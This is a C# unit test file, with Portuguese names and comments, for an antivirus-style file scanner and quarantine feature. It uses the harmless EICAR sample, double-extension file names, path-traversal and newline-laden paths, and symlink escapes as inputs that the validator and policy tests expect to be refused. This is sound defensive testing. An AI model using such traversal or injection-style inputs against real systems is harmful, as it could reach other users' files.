        var v = engine.Evaluate(@"D:\Jogos\jogo.exe", bytes, true, bytes.Length, ScannerSamples.Sha(bytes), ScannerSamples.Now.AddYears(-2));
        Assert.Equal(0, sig.Calls);
        Assert.Equal(Verdict.Clean, v.Verdict);
    }

    [Fact]
    public void Scan_walks_folders_without_following_links_and_honors_ignore_list()
    {
        using var tmp = new TempDir();
        var root = Path.Combine(tmp.Path, "alvo");
        var outside = Path.Combine(tmp.Path, "fora");
        Directory.CreateDirectory(Path.Combine(root, "sub"));
        Directory.CreateDirectory(outside);
        File.WriteAllBytes(Path.Combine(root, "eicar.com"), ScannerSamples.Eicar());
        File.WriteAllText(Path.Combine(root, "sub", "fatura.pdf.exe"), "não é PE");
        File.WriteAllText(Path.Combine(root, "leia.txt"), "texto comum");
        File.WriteAllBytes(Path.Combine(outside, "eicar2.com"), ScannerSamples.Eicar());
        var linked = true;
        try { Directory.CreateSymbolicLink(Path.Combine(root, "link"), outside); }
        catch (Exception ex) when (ex is IOException or UnauthorizedAccessException or PlatformNotSupportedException) { linked = false; }

        var reports = new List<ScanProgress>();
        var engine = ScannerSamples.Engine(options: new ScanOptions { UtcNow = () => ScannerSamples.Now, MaxDegreeOfParallelism = 2 });
        var found = new List<FileVerdict>();
        var summary = engine.Scan([root], new SyncProgress(reports.Add), v => { lock (found) found.Add(v); }, CancellationToken.None);
        Assert.False(summary.Cancelled);
        Assert.Equal(3, summary.Files);
        Assert.Equal(2, summary.Findings.Count);
        Assert.Equal(2, found.Count);
        Assert.Contains(summary.Findings, f => f.Path.EndsWith("eicar.com", StringComparison.Ordinal) && f.IsTestSample);
        Assert.Contains(summary.Findings, f => f.Path.EndsWith("fatura.pdf.exe", StringComparison.Ordinal) && f.Verdict >= Verdict.Review);
        if (linked) Assert.DoesNotContain(summary.Findings, f => f.Path.Contains("eicar2", StringComparison.Ordinal));
        Assert.NotEmpty(reports);
        Assert.Equal(3, reports[^1].Files);

        // Ignorar vale para caminho + hash: o mesmo arquivo some; se mudar, volta.
        var eicarPath = Path.Combine(root, "eicar.com");
        var ignore = new IgnoreList();
        ignore.Add(eicarPath, ScannerSamples.Sha(ScannerSamples.Eicar()), DateTimeOffset.UtcNow);
        var again = ScannerSamples.Engine(ignore: ignore, options: new ScanOptions { UtcNow = () => ScannerSamples.Now }).Scan([root], null, null, CancellationToken.None);
        Assert.DoesNotContain(again.Findings, f => f.Path == eicarPath);
        Assert.False(ignore.Contains(eicarPath, new string('0', 64)));
    }

    [Fact]
    public void Scan_can_be_cancelled()
    {
        using var tmp = new TempDir();
        for (var i = 0; i < 50; i++) File.WriteAllText(Path.Combine(tmp.Path, $"a{i}.ps1"), "Write-Host oi");
        using var cts = new CancellationTokenSource();
        cts.Cancel();
        var summary = ScannerSamples.Engine().Scan([tmp.Path], null, null, cts.Token);
        Assert.True(summary.Cancelled);
        Assert.True(summary.Files < 50);
    }

    [Fact]
    public void Large_files_get_name_heuristics_only_and_quick_mode_skips_small_unknown_files()
    {
        using var tmp = new TempDir();
        var big = Path.Combine(tmp.Path, "grande.pdf.exe");
        File.WriteAllBytes(big, new byte[2048]);
        var engine = ScannerSamples.Engine(options: new ScanOptions { MaxHashBytes = 1024, UtcNow = () => ScannerSamples.Now });
        var v = engine.ScanFile(big)!;
        Assert.Null(v.Sha256);
        Assert.Contains(v.Hits, h => h.RuleId == "name.double-extension");

        var txt = Path.Combine(tmp.Path, "eicar.txt");
        File.WriteAllBytes(txt, ScannerSamples.Eicar());
        Assert.True(ScannerSamples.Engine().ScanFile(txt)!.IsTestSample);
        var quick = ScannerSamples.Engine(options: new ScanOptions { ScanSmallFiles = false, UtcNow = () => ScannerSamples.Now });
        Assert.False(quick.ScanFile(txt)!.IsTestSample);
    }

    [Fact]
    public async Task Folder_watcher_scans_new_files_and_skips_partial_downloads()
    {
        using var tmp = new TempDir();
        var results = new System.Collections.Concurrent.ConcurrentQueue<FileVerdict>();
        using (new FolderWatcher(tmp.Path, ScannerSamples.Engine(), results.Enqueue, TimeSpan.FromMilliseconds(200)))
        {
            await File.WriteAllTextAsync(Path.Combine(tmp.Path, "baixando.crdownload"), "parcial");
            await File.WriteAllBytesAsync(Path.Combine(tmp.Path, "eicar.com"), ScannerSamples.Eicar());
            for (var i = 0; i < 100 && results.IsEmpty; i++) await Task.Delay(100);
        }
        Assert.Contains(results, v => v.Path.EndsWith("eicar.com", StringComparison.Ordinal) && v.IsTestSample);
        Assert.DoesNotContain(results, v => v.Path.EndsWith(".crdownload", StringComparison.Ordinal));
    }

    [Fact]
    public void Ignore_list_round_trips()
    {
        using var tmp = new TempDir();
        var path = Path.Combine(tmp.Path, "scanner", "ignore.json");
        var list = new IgnoreList();
        Assert.True(list.Add(@"C:\x\a.exe", new string('A', 64), DateTimeOffset.UtcNow));
        list.Save(path);
        var loaded = IgnoreList.Load(path);
        Assert.True(loaded.Contains(@"c:\X\A.EXE", new string('a', 64)));
        File.WriteAllText(path, "{ quebrado");
        Assert.Equal(0, IgnoreList.Load(path).Count);
    }

    private sealed class SyncProgress(Action<ScanProgress> report) : IProgress<ScanProgress>
    {
        private readonly Lock _gate = new();
        public void Report(ScanProgress value) { lock (_gate) report(value); }
    }
}

[Trait("Category", "Unit")]
public sealed class ScannerQuarantineTests
{
    private sealed class Locations(string root) : IQuarantineLocations
    {
        public string? WindowsDirectory => Path.Combine(root, "Windows");
        public IReadOnlyList<string> AdminOnlyRoots => [Path.Combine(root, "ProgramFiles"), Path.Combine(root, "ProgramData")];
        public string? UsersRoot => Path.Combine(root, "Users");
        public string? UserProfile(string? userSid) => Path.Combine(root, "Users", "eu");
    }

    private sealed class Fixture : IDisposable
    {
        private readonly TempDir _tmp = new();
        public string Root => _tmp.Path;
        public string Data => Path.Combine(Root, "data");
        public Locations Locations { get; }
        public Fixture() => Locations = new Locations(Root);

        public string File(string relative, byte[] content)
        {
            var path = Path.Combine(Root, relative);
            Directory.CreateDirectory(Path.GetDirectoryName(path)!);
            System.IO.File.WriteAllBytes(path, content);
            return path;
        }

        public ScannerQuarantineHandler Handler(bool elevated = false, bool cross = false) =>
            (ScannerQuarantineHandler)ScannerHandlers.Create(new HandlerEnvironment(new InMemoryRegistryBackend(), Data, false, elevated), Locations, cross).Single();

        public void Dispose() => _tmp.Dispose();
    }

    private static ActionInstance Action(string path, string sha, bool machine = false) =>
        new(T.Def(machine ? "scanner.quarantine.machine.01" : "scanner.quarantine.user.01", ScannerQuarantineHandler.Kind, machine ? PrivilegeLevel.Admin : PrivilegeLevel.User),
            new Dictionary<string, string> { ["scope"] = machine ? "HKLM" : "HKCU", ["path"] = path, ["sha256"] = sha },
            ScannerQuarantineHandler.DesiredState);

    private static (InMemoryJournal Journal, ActionExecutor Exec, DesiredStateResolver Resolver) Engine(IActionHandler h)
    {
        var reg = new HandlerRegistry().Add(h);
        var journal = new InMemoryJournal();
        return (journal, new ActionExecutor(reg, journal), new DesiredStateResolver(reg));
    }

    private static readonly byte[] Bad = Encoding.ASCII.GetBytes("conteúdo suspeito de teste");

    [Theory]
    [InlineData(false)]
    [InlineData(true)]
    public void Apply_moves_to_quarantine_and_revert_returns_byte_for_byte(bool crossVolume)
    {
        using var f = new Fixture();
        var path = f.File(Path.Combine("Users", "eu", "Downloads", "fatura.pdf.exe"), Bad);
        var h = f.Handler(cross: crossVolume);
        var a = Action(path, ScannerSamples.Sha(Bad));
        Assert.Equal(ScannerQuarantineHandler.Present, h.Detect(a).Value);
        var (journal, exec, resolver) = Engine(h);
        var run = journal.BeginRun("t", "1");
        Assert.Equal(ExecutionOutcome.Verified, exec.Execute(run, resolver.Resolve([a], T.Ctx), T.Ctx).Single().Outcome);
        Assert.False(File.Exists(path));
        var t = ScannerQuarantineHandler.TargetOf(a, out _)!;
        Assert.True(File.Exists(h.Store.PayloadPath(t)));
        Assert.EndsWith(".bin", h.Store.PayloadPath(t), StringComparison.Ordinal);
        var manifest = h.Store.ReadManifest(t)!;
        Assert.Equal("done", manifest.State);
        Assert.Equal(path, manifest.OriginalPath);
        Assert.Equal(ScannerQuarantineHandler.Quarantined, h.Detect(a).Value);

        exec.RevertRun(run);
        Assert.Equal(Bad, File.ReadAllBytes(path));
        Assert.False(Directory.Exists(h.Store.FolderOf(t)));
    }

    [Fact]
    public void Changed_hash_is_refused_and_nothing_moves()
    {
        using var f = new Fixture();
        var path = f.File(Path.Combine("Users", "eu", "a.exe"), Bad);
        var h = f.Handler();
        var a = Action(path, ScannerSamples.Sha(Encoding.ASCII.GetBytes("outra coisa")));
        Assert.Equal(ScannerQuarantineHandler.Changed, h.Detect(a).Value);
        Assert.Equal(ApplicabilityKind.Blocked, h.Assess(a, T.Ctx).Kind);
        Assert.Throws<InvalidOperationException>(() => h.Apply(a));
        Assert.True(File.Exists(path));
        Assert.False(Directory.Exists(h.Store.Root) && Directory.EnumerateFileSystemEntries(h.Store.Root).Any());
    }

    [Fact]
    public void Policy_refuses_windows_admin_roots_other_profiles_and_links()
    {
        using var f = new Fixture();
        var sha = ScannerSamples.Sha(Bad);
        var win = f.File(Path.Combine("Windows", "System32", "x.exe"), Bad);
        var pf = f.File(Path.Combine("ProgramFiles", "App", "x.exe"), Bad);
        var other = f.File(Path.Combine("Users", "outro", "x.exe"), Bad);
        var user = f.Handler();
        var admin = f.Handler(elevated: true);
        Assert.Equal(ApplicabilityKind.Blocked, user.Assess(Action(win, sha), T.Ctx).Kind);
        Assert.Equal(ApplicabilityKind.Blocked, admin.Assess(Action(win, sha, machine: true), T.Ctx).Kind);
        Assert.Equal(ApplicabilityKind.Blocked, user.Assess(Action(pf, sha), T.Ctx).Kind);
        Assert.Equal(ApplicabilityKind.Blocked, user.Assess(Action(pf, sha, machine: true), T.Ctx).Kind); // vaga de admin sem elevação
        Assert.Equal(ApplicabilityKind.Applicable, admin.Assess(Action(pf, sha, machine: true), T.Ctx).Kind);
        Assert.Equal(ApplicabilityKind.Blocked, user.Assess(Action(other, sha), T.Ctx).Kind);
        Assert.Equal(ApplicabilityKind.Applicable, admin.Assess(Action(other, sha, machine: true), T.Ctx).Kind);
        Assert.Equal(ApplicabilityKind.Blocked, user.Assess(Action(Path.Combine(f.Data, "x.exe"), sha), T.Ctx).Kind);
        Assert.Equal(ApplicabilityKind.Blocked, user.Assess(Action(Path.Combine(f.Root, "Users", "eu", "..", "outro", "x.exe"), sha), T.Ctx).Kind);
        Assert.Equal(ApplicabilityKind.Blocked, user.Assess(Action("relativo\\x.exe", sha), T.Ctx).Kind);

        var target = Path.Combine(f.Root, "Users", "eu", "real");
        Directory.CreateDirectory(target);
        f.File(Path.Combine("Users", "eu", "real", "y.exe"), Bad);
        try { Directory.CreateSymbolicLink(Path.Combine(f.Root, "Users", "eu", "atalho"), target); }
        catch (Exception ex) when (ex is IOException or UnauthorizedAccessException or PlatformNotSupportedException) { return; }
        Assert.Equal(ApplicabilityKind.Blocked, user.Assess(Action(Path.Combine(f.Root, "Users", "eu", "atalho", "y.exe"), sha), T.Ctx).Kind);
    }

    [Fact]
    public void Malformed_targets_are_refused()
    {
        var def = T.Def("scanner.quarantine.user.01", ScannerQuarantineHandler.Kind);
        ActionInstance A(Dictionary<string, string> t) => new(def, t, ScannerQuarantineHandler.DesiredState);
        var sha = new string('a', 64);
        Assert.Null(ScannerQuarantineHandler.TargetOf(A(new() { ["scope"] = "HKXX", ["path"] = "/x", ["sha256"] = sha }), out _));
        Assert.Null(ScannerQuarantineHandler.TargetOf(A(new() { ["scope"] = "HKCU", ["path"] = "/x", ["sha256"] = "ABC" }), out _));
        Assert.Null(ScannerQuarantineHandler.TargetOf(A(new() { ["scope"] = "HKCU", ["path"] = "/x", ["sha256"] = sha, ["extra"] = "1" }), out _));
        Assert.Null(ScannerQuarantineHandler.TargetOf(A(new() { ["scope"] = "HKLM", ["path"] = "/x", ["sha256"] = sha, ["userSid"] = "S-1-5-21-1-2-3-1001" }), out _));
        Assert.NotNull(ScannerQuarantineHandler.TargetOf(A(new() { ["scope"] = "HKCU", ["path"] = "/x", ["sha256"] = sha, ["userSid"] = "S-1-5-21-1-2-3-1001" }), out _));
    }

    [Fact]
    public void Restore_never_overwrites_a_new_file_and_refuses_tampered_payload()
    {
        using var f = new Fixture();
        var path = f.File(Path.Combine("Users", "eu", "b.exe"), Bad);
        var h = f.Handler();
        var a = Action(path, ScannerSamples.Sha(Bad));
        var (journal, exec, resolver) = Engine(h);
        var run = journal.BeginRun("t", "1");
        exec.Execute(run, resolver.Resolve([a], T.Ctx), T.Ctx);
        File.WriteAllText(path, "arquivo novo do usuário");
        var present = StateSnapshot.Of(ScannerQuarantineHandler.StateType, ScannerQuarantineHandler.Present);
        Assert.Null(h.CheckRestore(a, present));
        h.Restore(a, present);
        Assert.Equal("arquivo novo do usuário", File.ReadAllText(path));
        Assert.Equal(Bad, File.ReadAllBytes(Path.Combine(Path.GetDirectoryName(path)!, "b (restaurado pelo NEXUS).exe")));

        // Quarentena adulterada: recusa devolver.
        var path2 = f.File(Path.Combine("Users", "eu", "c.exe"), Bad);
        var a2 = Action(path2, ScannerSamples.Sha(Bad));
        h.Apply(a2);
        var t2 = ScannerQuarantineHandler.TargetOf(a2, out _)!;
        File.WriteAllText(h.Store.PayloadPath(t2), "trocado");
        Assert.NotNull(h.CheckRestore(a2, present));
        Assert.Throws<InvalidOperationException>(() => h.Restore(a2, present));
        Assert.False(File.Exists(path2));

        // Original "ausente": nada a devolver.
        h.Restore(a2, StateSnapshot.Absent());
        Assert.Null(h.CheckRestore(a2, StateSnapshot.Absent()));
    }

    [Fact]
    public void Missing_file_is_not_applicable()
    {
        using var f = new Fixture();
        var h = f.Handler();
        var a = Action(Path.Combine(f.Root, "Users", "eu", "sumiu.exe"), new string('a', 64));
        Assert.False(h.Detect(a).Exists);
        Assert.Equal(ApplicabilityKind.NotApplicable, h.Assess(a, T.Ctx).Kind);
    }

    [Fact]
    public void Catalog_loads_and_every_kind_is_registered()
    {
        var all = CatalogLoader.LoadDirectory(Path.Combine(AppContext.BaseDirectory, "catalog"));
        var mine = all.Actions.Where(a => a.Definition.Id.StartsWith("scanner.", StringComparison.Ordinal)).ToList();
        Assert.Equal(14, mine.Count);
        Assert.Equal(all.Actions.Count, all.Actions.Select(a => a.Definition.Key).Distinct().Count());
        using var tmp = new TempDir();
        var kinds = ScannerHandlers.Create(new HandlerEnvironment(new InMemoryRegistryBackend(), tmp.Path, false, false)).Select(h => h.HandlerKind).ToHashSet();
        Assert.All(mine, a => Assert.Contains(a.Definition.HandlerKind, kinds));
        Assert.All(mine.Where(a => a.Definition.Id.Contains(".user.", StringComparison.Ordinal)), a =>
        {
            Assert.Equal(PrivilegeLevel.User, a.Definition.Privileges);
            Assert.Equal("HKCU", a.TargetTemplate["scope"]);
        });
        Assert.All(mine.Where(a => a.Definition.Id.Contains(".machine.", StringComparison.Ordinal)), a => Assert.Equal(PrivilegeLevel.Admin, a.Definition.Privileges));

        var entry = mine[0];
        var sha = new string('a', 64);
        Assert.NotNull(entry.ValidateUserArguments(new Dictionary<string, string> { ["path"] = @"C:\Users\eu\Downloads\fatura.pdf.exe", ["sha256"] = sha }, out _));
        Assert.Null(entry.ValidateUserArguments(new Dictionary<string, string> { ["path"] = @"C:\Users\eu\..\outro\x.exe", ["sha256"] = sha }, out _));
        Assert.Null(entry.ValidateUserArguments(new Dictionary<string, string> { ["path"] = @"relativo\x.exe", ["sha256"] = sha }, out _));
        Assert.Null(entry.ValidateUserArguments(new Dictionary<string, string> { ["path"] = @"C:\x.exe", ["sha256"] = sha.ToUpperInvariant() }, out _));
        Assert.Null(entry.ValidateUserArguments(new Dictionary<string, string> { ["path"] = "C:\\x.exe\n", ["sha256"] = sha }, out _));
        var instance = entry.TryInstantiate(entry.ValidateUserArguments(new Dictionary<string, string> { ["path"] = @"C:\a\b.exe", ["sha256"] = sha }, out _)!, out _)!;
        Assert.True(instance.Desired.SameValueAs(ScannerQuarantineHandler.DesiredState));
        Assert.True(UserProfileScope.IsUserScoped(instance)); // como serviço, o broker grava o SID de quem pediu
    }
}
